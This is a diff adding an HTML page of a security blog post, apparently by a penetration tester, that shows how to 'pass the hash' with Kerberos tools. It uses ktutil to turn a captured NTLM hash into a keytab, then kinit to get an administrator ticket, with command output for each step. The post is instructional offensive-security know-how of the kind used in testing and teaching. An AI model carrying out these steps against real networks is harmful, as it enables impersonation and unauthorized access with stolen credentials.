@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Pass the Hash with Kerberos &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.42.2" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2018/pass-the-hash-with-kerberos/">Pass the Hash with Kerberos</a></h1>
+            <span class="post-date">Jul 24, 2018 </span>
+            <div class="post-content">
+                <p>This blog post may be of limited use, most of the time that you have a NTLM hash you have the tools to use it. But, if you find yourself in a situation where you don&rsquo;t have to tools and do have kerberos tools, you can pass the hash with it.</p>
+
+<p>Lets say with have the NTLM hash for the user <code>uberuser</code> and the hash is <code>88e4d9fabaecf3dec18dd80905521b29</code>. The first step to do so is to create a keytab file using <code>ktutil</code>:</p>
+
+<pre><code>root@wpad:~# ktutil
+</code></pre>
+
+<p>At the <code>ktutil</code> prompt, type in the &ldquo;add entry&rdquo; (<code>addent</code>) command with the &ldquo;principle&rdquo; (<code>-p</code>) flag. Specify the user and an all upercase version of the FQDN. Then the &ldquo;KVNO&rdquo; (<code>-k 1</code>), which is the key number. Finally the encryption type, which is <code>rc4-hmac</code> for NTLM hashes:</p>
+
+<pre><code>ktutil: addent -p administrator@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
+</code></pre>
+
+<p>After you hit enter you&rsquo;ll get prompted for the rc4-hmac (NTLM) hash:</p>
+
+<pre><code>Key for administrator@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
+</code></pre>
+
+<p>Then we write the keytab file to disk and exit <code>ktutil</code></p>
+
+<pre><code>ktutil: wkt /tmp/a.keytab
+ktutil: exit
+</code></pre>
+
+<p>The last step before we can use our authentication it to create a kerberos ticket using out keytab file.</p>
+
+<pre><code>root@wpad:~# kinit -V -k -t /tmp/a.keytab -f administrator@CORP.SOMEWHATREALNEWS.COM
+Using default cache: /tmp/krb5cc_0
+Using principal: administrator@CORP.SOMEWHATREALNEWS.COM
+Using keytab: /tmp/a.keytab
+Authenticated to Kerberos v5
+</code></pre>
+
+<p>Validate it with <code>klist</code>:</p>
+
+<pre><code>root@wpad:~# klist
+Ticket cache: FILE:/tmp/krb5cc_0
+Default principal: administrator@CORP.SOMEWHATREALNEWS.COM
+
+Valid starting       Expires              Service principal
+07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
+	renew until 07/23/2018 21:38:40
+
+</code></pre>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
